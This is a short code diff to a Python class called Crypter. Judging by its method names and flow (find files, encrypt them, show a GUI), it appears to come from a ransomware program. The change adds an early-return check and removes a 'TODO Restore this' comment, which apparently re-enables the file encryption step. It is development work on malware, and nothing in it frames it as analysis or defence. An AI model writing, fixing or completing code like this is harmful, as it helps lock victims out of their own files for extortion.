@@ -44,8 +44,10 @@ class Crypter(Base.Base):
     if not os.path.isfile(self.encrypted_file_list):
       self.Crypt.init_keys()
       file_list = self.find_files()
+      # If no files were encrypted. do nothing 
+      if not os.path.isfile(self.encrypted_file_list):
+          return
       # Start encryption
-      # TODO Restore this
       self.encrypt_files(file_list)
       # Present GUI
       self.start_gui()
